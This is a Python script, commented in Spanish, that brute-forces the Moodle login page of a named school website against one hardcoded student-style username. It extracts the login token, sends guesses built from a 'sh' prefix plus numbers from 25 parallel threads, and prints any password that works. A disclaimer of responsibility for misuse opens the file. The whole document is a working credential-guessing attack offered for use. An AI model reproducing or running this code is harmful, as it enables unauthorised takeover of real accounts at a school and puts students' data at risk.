#No me hago responsable por el mal uso del código :)

import requests
import colorama
from colorama import Fore, Style
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

colorama.init()

RED = Fore.RED
GREEN = Fore.GREEN
RESET = Style.RESET_ALL

URL_LOGIN = "https://santiagohernandez.aeducar.es/login/index.php" #Pon la direccion de tu instituto
URL_SUCCESS = "https://santiagohernandez.aeducar.es/" #Modifica y pon lo que sale en la url de web tras que se inicia sesion
USUARIO_BASE = "urcuyolezma2022"  # Tu usuario que quieres probar
PATRON_CONTRASEÑA = "sh"  # Patrón de contraseña como empieza
RANGO_CONTRASEÑA = range(10000, 99999)  # Rango de números a probar (6 dígitos)
NUM_THREADS = 25  # Número de hilos a utilizar (Velocidad)

def generar_contrasenas(patron, rango):
    return [f"{patron}{str(num).zfill(6)}" for num in rango]

def obtener_token_sesion(session):
    response = session.get(URL_LOGIN)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, "html.parser")
        token_input = soup.find("input", {"name": "logintoken"})
        if token_input:
            return token_input["value"]
    return None

def intentar_login(usuario, contrasena):
    with requests.Session() as session:
        token = obtener_token_sesion(session)
        if not token:
            print(f"No se pudo obtener el token de sesión para {contrasena}.")
            return False

        payload = {
            "username": usuario,
            "password": contrasena,
            "logintoken": token
        }
        
        response = session.post(URL_LOGIN, data=payload, allow_redirects=True)
        
        if response.url == URL_SUCCESS:
            return True

        if "Acceso inválido. Por favor, inténtelo otra vez." in response.text:
            return False
        
        return False

def main():
    start_time = time.time()  
    contrasenas = generar_contrasenas(PATRON_CONTRASEÑA, RANGO_CONTRASEÑA)

    with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
        futures = {executor.submit(intentar_login, USUARIO_BASE, contrasena): contrasena for contrasena in contrasenas}

        for future in as_completed(futures):
            contrasena = futures[future]
            try:
                if future.result():
                    end_time = time.time()  
                    elapsed_time = end_time - start_time
                    if elapsed_time < 60:
                        time_str = f"{elapsed_time:.2f} seconds"
                    elif elapsed_time < 3600:
                        time_str = f"{elapsed_time / 60:.2f} minutes"
                    else:
                        time_str = f"{elapsed_time / 3600:.2f} hours"

                    print(f"{GREEN}[+] Valid {USUARIO_BASE} - {contrasena}{RESET}") #Valido
                    print(f"Bruteforced in {time_str}")
                    executor.shutdown(wait=False, cancel_futures=True)
                    return
                else:
                    print(f"{RED}[-] Invalid {USUARIO_BASE} & {contrasena}{RESET}") #Invalido
            except Exception as e:
                print(f"Wrong {contrasena}: {e}")

if __name__ == "__main__":
    main()
